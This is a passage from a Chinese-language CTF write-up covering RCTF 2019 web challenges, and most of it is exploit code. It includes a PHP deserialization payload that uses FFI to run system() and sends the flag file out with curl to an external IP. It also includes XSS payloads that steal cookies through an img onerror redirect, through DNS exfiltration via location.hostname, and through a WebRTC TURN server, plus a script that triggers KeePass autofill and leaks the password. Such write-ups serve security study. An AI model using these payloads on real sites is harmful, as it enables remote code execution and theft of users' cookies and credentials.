class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span><span class="params">()</span>: <span class="title">array</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span><span class="params">(array $data)</span> </span>&#123;</span><br><span class="line">        array_merge(<span class="keyword">$this</span>-&gt;data, $data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> <span class="params">($key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> <span class="params">($key, $value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹æƒé™<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://nextphp.2019.rctf.rois.io/?a=var_dump(base_convert(fileperms(%27./%27),10,8));</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(5) &quot;40755&quot;</span><br></pre></td></tr></table></figure><p>å‘ç°å¹¶ä¸å¯å†™<br>åˆ©ç”¨ffiæ¥å¼•å…¥libcä¸­çš„systemå‡½æ•°<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(eval(&apos;FFI::cdef(&quot;int system(const char *command);&quot;, &quot;libc.so.6&quot;)-&gt;system(&quot;ls&quot;);&apos;));</span><br></pre></td></tr></table></figure></p><p>ä½†æ˜¯ååºåˆ—åŒ–ä¸­çš„runåªæœ‰ä¸€ä¸ªå‚æ•°é€‰é¡¹ï¼Œåé¢å‘ç°systemçš„æ‰§è¡Œä¸éœ€è¦å¼•å…¥soæ–‡ä»¶<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(eval(&apos;FFI::cdef(&quot;int system(const char *command);&quot;)-&gt;system(&quot;ls&quot;);&apos;));</span><br></pre></td></tr></table></figure></p><p>æˆåŠŸç²¾ç®€ï¼Œä»è€Œæ„é€ å¦‚ä¸‹exp<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $data = [</span><br><span class="line"><span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line"><span class="string">'func'</span> =&gt; <span class="string">'FFI::cdef'</span>,</span><br><span class="line"><span class="string">'arg'</span> =&gt; <span class="string">'int system(const char *command);'</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span><span class="params">()</span>: <span class="title">array</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span><span class="params">(array $data)</span> </span>&#123;</span><br><span class="line">array_merge(<span class="keyword">$this</span>-&gt;data, $data);</span><br><span class="line"><span class="keyword">$this</span>-&gt;run();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span><span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line"><span class="keyword">$this</span>-&gt;run();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// public function __set ($key, $value) &#123;</span></span><br><span class="line"><span class="comment">//     throw new \Exception('No implemented');</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// public function __construct () &#123;</span></span><br><span class="line"><span class="comment">//     throw new \Exception('No implemented');</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A;</span><br><span class="line">$ser = base64_encode(serialize($a));</span><br><span class="line">var_dump($ser);</span><br></pre></td></tr></table></figure></p><p>åˆ©ç”¨curlå¸¦å¤–ä¼ è¾“å¾—åˆ°flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://nextphp.2019.rctf.rois.io/?a=$a=%27QzoxOiJBIjo5NTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czozMjoiaW50IHN5c3RlbShjb25zdCBjaGFyICpjb21tYW5kKTsiO319%27;$b=unserialize(base64_decode($a));$b-%3Eret-%3Esystem(%27curl%20-i%20http://47.90.204.28:2345/`cat%20/flag|base64`%27);</span><br></pre></td></tr></table></figure></p><h2 id="0x02-jail"><a href="#0x02-jail" class="headerlink" title="0x02 jail"></a>0x02 jail</h2><p>æ€è·¯å¾ˆæ˜ç¡®å°±æ˜¯è¦è®©botè®¿é—®æˆ‘ä»¬çš„é“¾æ¥ç„¶åäº¤å‡ºcookieï¼Œå› æ­¤å°±è€ƒè™‘æ€ä¹ˆæ‰“cookie</p><p>é¦–å…ˆçœ‹ä¸€ä¸‹CSP<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: sandbox allow-scripts allow-same-origin; base-uri &apos;none&apos;;default-src &apos;self&apos;;script-src &apos;unsafe-inline&apos; &apos;self&apos;;connect-src &apos;none&apos;;object-src &apos;none&apos;;frame-src &apos;none&apos;;font-src data: &apos;self&apos;;style-src &apos;unsafe-inline&apos; &apos;self&apos;;</span><br></pre></td></tr></table></figure></p><p>å¦‚ä¸‹payloadå¯ä»¥åœ¨firefoxä¸Šæ‰“åˆ°cookieï¼Œä½†æ˜¯åœ¨chromeä¸Šæ˜¯æ‰“ä¸åˆ°cookieçš„<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=&quot;location.href=&apos;http://47.90.204.28:8080/?&apos;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://ae01.alicdn.com/kf/H0efd773688214817af5760f957053cf8y.png" alt></p><p>æ ¹æ®æç¤ºflagåœ¨cookieé‡Œé¢ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥è®©botå»æ‰“å°±å¥½äº†ï¼Œä½†æ˜¯botæ‰“ä¸åˆ°ï¼Œæ‰€ä»¥botæœ‰å¯èƒ½æ˜¯chromeå†™çš„ã€‚é‚£ä¹ˆè½¬æ¢æ€è·¯ã€‚</p><p>PS: CSPåœ¨è·³è½¬é¢å‰æ˜¯è‹ç™½æ— åŠ›çš„</p><p>ä½†æ˜¯<code>document.location</code>è¢«freezeäº†</p><p>ä½†æ˜¯å‘ç°hostå’Œhostnameå±æ€§éƒ½æ˜¯å¯ä»¥æ”¹çš„ï¼Œè€Œä¸”å¯ä»¥è¾¾åˆ°ä¸€ä¸ªè·³è½¬çš„æ•ˆæœã€‚å› æ­¤é‡‡ç”¨DNSæ¥åšå¸¦å¤–ä¼ è¾“ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stringToHex</span>(<span class="params">str</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> val=<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; str.length; i++)&#123;</span><br><span class="line">      <span class="keyword">if</span>(val == <span class="string">""</span>)</span><br><span class="line">        val = str.charCodeAt(i).toString(<span class="number">16</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        val += str.charCodeAt(i).toString(<span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">  &#125;</span><br><span class="line">location.hostname=stringToHex(<span class="built_in">document</span>.cookie).substr(<span class="number">0</span>,<span class="number">60</span>)+<span class="string">".bjslfd.ceye.io"</span>&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆé€šè¿‡åˆ†æ®µè¯»å–è·å¾—flag</p><p>RCTF{welc0me_t0_the_chaos_w0r1}</p><p>æ­¤å¤–è¿˜æœ‰ç¬¬äºŒç§è§£æ³•</p><p>ä¹‹å‰æˆ‘ä»¬æ³¨æ„åˆ°CSPä¸­æœ‰ä¸ª connect-src â€˜noneâ€™; é‚£ä¹ˆæœ‰æ²¡æœ‰åŠæ³•bypassæ‰è¿™ä¸€ç‚¹å‘¢ï¼Œç­”æ¡ˆæ˜¯è‚¯å®šçš„</p><p>å‚è€ƒï¼š<a href="https://github.com/w3c/webrtc-pc/issues/1727" target="_blank" rel="noopener">https://github.com/w3c/webrtc-pc/issues/1727</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> pc = <span class="keyword">new</span> RTCPeerConnection(&#123;<span class="string">"iceServers"</span>:[&#123;<span class="string">"urls"</span>:[<span class="string">"turn:74.125.140.127:19305?transport=udp"</span>],<span class="string">"username"</span>:<span class="string">"_all_your_data_belongs_to_us"</span>,<span class="string">"credential"</span>:<span class="string">"."</span>&#125;]&#125;);</span><br><span class="line">pc.createOffer().then(<span class="function">(<span class="params">sdp</span>)=&gt;</span>pc.setLocalDescription(sdp);</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ä¸Šé¢æåˆ°çš„poc</p><p>sudo turnserver  -L 172.16.47.44 -a -u zeroyu:123456 -v -f -r 106.14.114.127</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">iceCallback</span>(<span class="params">event</span>) </span>&#123;&#125;</span><br><span class="line">config = &#123;</span><br><span class="line"><span class="string">"iceServers"</span>: [&#123;</span><br><span class="line"><span class="string">"urls"</span>: [<span class="string">"turn:47.90.204.28:8080"</span>],</span><br><span class="line"><span class="string">"username"</span>: <span class="built_in">document</span>.cookie,</span><br><span class="line"><span class="string">"credential"</span>: <span class="string">"zeroyu"</span></span><br><span class="line">&#125;],</span><br><span class="line"><span class="string">"iceTransportPolicy"</span>: <span class="string">"all"</span>,</span><br><span class="line"><span class="string">"iceCandidatePoolSize"</span>: <span class="string">"0"</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> offerOptions = &#123;</span><br><span class="line">offerToReceiveAudio: <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`Creating new PeerConnection with config=<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(config)&#125;</span>`</span>);</span><br><span class="line"><span class="comment">// configæ˜¯ç”¨æ¥è®¾ç½®é“¾æ¥turnæœåŠ¡å™¨ä½¿ç”¨çš„</span></span><br><span class="line">pc = <span class="keyword">new</span> RTCPeerConnection(config);</span><br><span class="line"><span class="comment">// onicecandidate æ˜¯æ”¶åˆ° icecandidate äº‹ä»¶æ—¶è°ƒç”¨çš„äº‹ä»¶å¤„ç†å™¨.ã€‚å½“ä¸€ä¸ª RTCICECandidate å¯¹è±¡è¢«æ·»åŠ æ—¶ï¼Œè¿™ä¸ªäº‹ä»¶è¢«è§¦å‘ã€‚</span></span><br><span class="line">pc.onicecandidate = iceCallback;</span><br><span class="line">pc.createOffer(</span><br><span class="line">offerOptions</span><br><span class="line">).then(</span><br><span class="line">gotDescription,</span><br><span class="line">noDescription</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gotDescription</span>(<span class="params">desc</span>) </span>&#123;</span><br><span class="line">pc.setLocalDescription(desc);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noDescription</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Error creating offer: '</span>, error);</span><br><span class="line">&#125; </span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™ç§æ–¹å¼åœ¨æœ¬åœ°macOSä¸Šæ²¡æœ‰æˆåŠŸï¼Œéšåå¯ä»¥åœ¨æœåŠ¡å™¨ä¸Šè¯•ä¸€ä¸‹</p><h2 id="0x03-password"><a href="#0x03-password" class="headerlink" title="0x03 password"></a>0x03 password</h2><p>è¿›ä¸€æ­¥è¦æ±‚ä½¿ç”¨åˆ©ç”¨xssæ‰“åˆ°å¯¹åå°çš„å¯†ç ï¼Œä½†æ˜¯å¯†ç ä¸æ˜¯ä½¿ç”¨chromeçš„AutoSaveï¼Œæ­¤å¤„å†™payload1ä¸è¦ç”¨chromeï¼Œä¸€å®šè¦ç”¨firefoxï¼Œä¸ç„¶ä»€ä¹ˆéƒ½æ‰“ä¸åˆ°ï¼ˆæ„Ÿè§‰å¯èƒ½æ˜¯æœ€æ–°ç‰ˆçš„chromeé™åˆ¶äº†è¿™ç§è·³è½¬ï¼Œå¿…é¡»ç‚¹å‡»ä¸€ä¸‹æ‰èƒ½è·³ï¼‰</p><p>ä¾æ®ä¸Šé¢çš„æ€è·¯è¿˜æ˜¯å…ˆåˆ†æ®µè¯»æºç </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form <span class="class"><span class="keyword">class</span></span>=<span class="string">"ui large form"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"ui stacked segment"</span>&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"field"</span>&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"ui left icon input"</span>&gt;</span><br><span class="line">&lt;i <span class="class"><span class="keyword">class</span></span>=<span class="string">"user icon"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">&lt;input type=<span class="string">"text"</span> id=<span class="string">"username"</span> name=<span class="string">"username"</span> placeholder=<span class="string">"Username"</span>&gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>div&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"field"</span>&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"ui left icon input"</span>&gt;</span><br><span class="line">&lt;i <span class="class"><span class="keyword">class</span></span>=<span class="string">"lock icon"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">&lt;input type=<span class="string">"password"</span> id=<span class="string">"password"</span> autocomplete=<span class="string">"on"</span> name=<span class="string">"password"</span> placeholder=<span class="string">"Password"</span> &gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>div&gt;</span><br><span class="line">&lt;button <span class="class"><span class="keyword">class</span></span>=<span class="string">"ui fluid large submit button"</span> type=<span class="string">"submit"</span>&gt;Login&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>div&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"ui error message"</span> style=<span class="string">""</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stringToHex</span>(<span class="params">str</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> val=<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; str.length; i++)&#123;</span><br><span class="line">      <span class="keyword">if</span>(val == <span class="string">""</span>)</span><br><span class="line">        val = str.charCodeAt(i).toString(<span class="number">16</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        val += str.charCodeAt(i).toString(<span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">  &#125;</span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">   location.hostname=stringToHex(btoa(<span class="built_in">document</span>.body.innerHTML)).substr(<span class="number">1800</span>,<span class="number">60</span>)+<span class="string">".bjslfd.ceye.io"</span>;</span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>ä¹‹åæºç ä¸­ä¼šå¤šå‡º<code>data-cip-id</code>å±æ€§ï¼Œä»è€Œåˆ¤æ–­æ˜¯<code>ChromeIPass+Keepass</code>ï¼Œé‚£ä¹ˆä¹‹åå°±æ˜¯å®šä½+ç‚¹å‡»å®Œæˆå¯†ç å¡«å……å·¥ä½œã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form <span class="class"><span class="keyword">class</span></span>=<span class="string">"ui large form"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"ui stacked segment"</span>&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"field"</span>&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"ui left icon input"</span>&gt;</span><br><span class="line">&lt;i <span class="class"><span class="keyword">class</span></span>=<span class="string">"user icon"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">&lt;input type=<span class="string">"text"</span> id=<span class="string">"username"</span> name=<span class="string">"username"</span> placeholder=<span class="string">"Username"</span>&gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>div&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"field"</span>&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"ui left icon input"</span>&gt;</span><br><span class="line">&lt;i <span class="class"><span class="keyword">class</span></span>=<span class="string">"lock icon"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">&lt;input type=<span class="string">"password"</span> id=<span class="string">"password"</span> autocomplete=<span class="string">"on"</span> name=<span class="string">"password"</span> placeholder=<span class="string">"Password"</span> &gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>div&gt;</span><br><span class="line">&lt;button <span class="class"><span class="keyword">class</span></span>=<span class="string">"ui fluid large submit button"</span> type=<span class="string">"submit"</span>&gt;Login&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>div&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"ui error message"</span> style=<span class="string">""</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stringToHex</span>(<span class="params">str</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> val=<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; str.length; i++)&#123;</span><br><span class="line">      <span class="keyword">if</span>(val == <span class="string">""</span>)</span><br><span class="line">        val = str.charCodeAt(i).toString(<span class="number">16</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        val += str.charCodeAt(i).toString(<span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">  &#125;</span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">document</span>.getElementsByName(<span class="string">'username'</span>)[<span class="number">0</span>].click();</span><br><span class="line">  <span class="built_in">document</span>.getElementsByClassName(<span class="string">'cip-ui-menu-item'</span>)[<span class="number">1</span>].click();</span><br><span class="line">   location.hostname=stringToHex(btoa(<span class="built_in">document</span>.getElementsByName(<span class="string">'password'</span>)[<span class="number">0</span>].value)).substr(<span class="number">0</span>,<span class="number">60</span>)+<span class="string">".bjslfd.ceye.io"</span>;</span><br><span class="line">  &#125;, <span class="number">3000</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆæˆåŠŸæ‰“åˆ°flag</p><p>cmN0ZntrcEh0dHBfbTR5X2xlYWtfdXJfcHdkfQ==</p><p>rctf{kpHttp_m4y_leak_ur_pwd}</p><h2 id="0x04-rblog"><a href="#0x04-rblog" class="headerlink" title="0x04 rblog"></a>0x04 rblog</h2><p>XSS Bot is running on Windows Server 2008R2<br>Google Chrome is up to date<br>Version 74.0.3729.157 (Official Build) (64-bit)</p><p>é¦–å…ˆæŸ¥çœ‹CSP<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content-security-policy: default-src &apos;self&apos;; object-src &apos;none&apos;</span><br></pre></td></tr></table></figure></p><p>æ£€æµ‹ä¸€ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°æåˆ°JSONPå¯èƒ½ä¼šå¸¦æ¥ä¸€äº›é—®é¢˜ï¼Œè€Œä¸”é¢˜ç›®ä¹Ÿæç¤ºåˆ°äº†è¿™ä¸€ç‚¹<br><img src="https://ae01.alicdn.com/kf/Hbb9261d122aa437090d4c2537562fedbf.png" alt></p><p>å³é”®æºç ï¼Œå‘ç°rblog.js<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">https://rblog.2019.rctf.rois.io/rblog.js</span><br><span class="line"></span><br><span class="line">axios.get(&apos;/api/v2/posts&apos;).then(resp =&gt; &#123;</span><br><span class="line">let html = &apos;&apos;</span><br><span class="line">if (resp.data.status) &#123;</span><br><span class="line">for (let i of resp.data.data) &#123;</span><br><span class="line">html += `&lt;a href=&quot;$&#123;i.markdown_url&#125;&quot;&gt;$&#123;i.title&#125;&lt;/a&gt;\r\n`</span><br><span class="line">&#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">html += `;_; 